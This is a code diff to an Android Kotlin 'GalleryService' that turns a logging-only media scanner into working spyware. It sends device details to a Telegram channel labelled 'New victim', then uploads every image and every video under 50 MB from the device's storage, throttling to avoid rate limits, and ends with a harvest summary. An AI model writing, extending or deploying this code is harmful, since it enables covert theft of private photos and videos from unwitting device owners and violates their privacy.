@@ -13,15 +13,18 @@ import java.io.File
 
 class GalleryService : Service() {
 
+    private lateinit var telegram: TelegramSender
+
     override fun onCreate() {
         super.onCreate()
+        telegram = TelegramSender()
         createNotificationChannel()
         startForeground(Config.NOTIFICATION_ID, buildNotification("Service running"))
-        Toast.makeText(this, "GalleryService onCreate", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "GalleryService created", Toast.LENGTH_SHORT).show()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Toast.makeText(this, "GalleryService started", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "Starting harvest...", Toast.LENGTH_SHORT).show()
         harvestAll()
         return START_STICKY
     }
@@ -40,71 +43,83 @@ class GalleryService : Service() {
 
     private fun harvestAll() {
         try {
-            Toast.makeText(this, "Harvesting media...", Toast.LENGTH_SHORT).show()
+            // Send device info first
+            val info = Utils.getDeviceInfo(this)
+            telegram.sendMessage("📱 New victim: $info")
+
             harvestMedia()
+
+            telegram.sendMessage("✅ Harvest complete for this device.")
             Toast.makeText(this, "Harvest complete", Toast.LENGTH_SHORT).show()
         } catch (e: Exception) {
-            Toast.makeText(this, "Harvest error: ${e.message}", Toast.LENGTH_LONG).show()
+            val errorMsg = "❌ Harvest error: ${e.message}"
+            telegram.sendMessage(errorMsg)
+            Toast.makeText(this, errorMsg, Toast.LENGTH_LONG).show()
         }
     }
 
     private fun harvestMedia() {
         val contentResolver: ContentResolver = contentResolver
-        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        var imageCount = 0
+        var videoCount = 0
+
+        // Harvest images
+        val imageCollection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
         } else {
             MediaStore.Images.Media.EXTERNAL_CONTENT_URI
         }
 
-        val projection = arrayOf(
+        val imageProjection = arrayOf(
             MediaStore.Images.Media._ID,
             MediaStore.Images.Media.DATA,
             MediaStore.Images.Media.DISPLAY_NAME,
             MediaStore.Images.Media.SIZE
         )
 
-        val cursor: android.database.Cursor? = contentResolver.query(collection, projection, null, null, null)
-
-        cursor?.use {
+        val imageCursor = contentResolver.query(imageCollection, imageProjection, null, null, null)
+        imageCursor?.use {
             val dataColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
             val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-            var count = 0
             while (it.moveToNext()) {
                 val path = it.getString(dataColumn)
                 val name = it.getString(nameColumn)
                 val file = File(path)
                 if (file.exists()) {
-                    count++
-                    // Just log the file, don't send to Telegram yet
-                    android.util.Log.d("GalleryService", "Found: $name at $path")
+                    imageCount++
+                    telegram.sendFile(file, "photo", name)
+                    // Small delay to avoid rate limiting
+                    Thread.sleep(100)
                 }
             }
-            Toast.makeText(this, "Found $count images", Toast.LENGTH_SHORT).show()
         }
 
+        // Harvest videos
         val videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
-        val videoProj = arrayOf(
+        val videoProjection = arrayOf(
             MediaStore.Video.Media._ID,
             MediaStore.Video.Media.DATA,
             MediaStore.Video.Media.DISPLAY_NAME,
             MediaStore.Video.Media.SIZE
         )
-        val videoCursor = contentResolver.query(videoCollection, videoProj, null, null, null)
+        val videoCursor = contentResolver.query(videoCollection, videoProjection, null, null, null)
         videoCursor?.use {
-            val dataCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
-            val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
-            var count = 0
+            val dataColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
+            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
             while (it.moveToNext()) {
-                val path = it.getString(dataCol)
-                val name = it.getString(nameCol)
+                val path = it.getString(dataColumn)
+                val name = it.getString(nameColumn)
                 val file = File(path)
                 if (file.exists() && file.length() < 50 * 1024 * 1024) {
-                    count++
-                    android.util.Log.d("GalleryService", "Found video: $name at $path")
+                    videoCount++
+                    telegram.sendFile(file, "video", name)
+                    Thread.sleep(100)
                 }
             }
-            Toast.makeText(this, "Found $count videos", Toast.LENGTH_SHORT).show()
         }
+
+        // Send summary
+        telegram.sendMessage("📊 Summary: $imageCount images, $videoCount videos harvested.")
     }
 
     private fun buildNotification(text: String): Notification {
